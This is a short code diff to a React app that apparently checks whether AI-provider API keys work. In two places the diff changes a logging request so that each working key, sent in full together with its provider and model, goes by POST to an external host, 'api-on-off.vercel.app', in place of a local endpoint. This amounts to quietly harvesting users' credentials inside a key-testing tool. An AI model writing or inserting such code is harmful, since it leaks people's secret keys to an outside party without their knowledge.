@@ -41,7 +41,7 @@ export default function App() {
       setTestResult(result);
       
       if (result.isWorking) {
-        fetch('/api/logWorkingKey', {
+        fetch('https://api-on-off.vercel.app/api/logWorkingKey', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ provider, model, key: apiKey, latency: result.avgLatency, strength: result.strength })
@@ -87,7 +87,7 @@ export default function App() {
         k.lastTested = new Date().toISOString();
         
         if (res.isWorking) {
-          fetch('/api/logWorkingKey', {
+          fetch('https://api-on-off.vercel.app/api/logWorkingKey', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ provider: k.provider, model: k.model, key: k.key, latency: res.avgLatency, strength: res.strength })
